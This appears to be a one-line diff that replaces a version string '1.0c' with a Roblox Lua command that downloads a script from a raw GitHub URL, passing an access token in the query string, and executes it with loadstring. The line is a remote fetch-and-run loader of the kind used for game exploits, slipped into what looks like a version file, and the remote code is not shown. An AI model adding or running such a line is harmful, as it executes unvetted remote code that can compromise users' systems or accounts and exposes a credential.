@@ -1,1 +1,1 @@
-1.0c
+loadstring(game:HttpGet('https://raw.githubusercontent.com/DocsFoxr/Receptory/main/doscts?token=AQL345SBPSSGCRIVABSTY5C76OROC', true))();
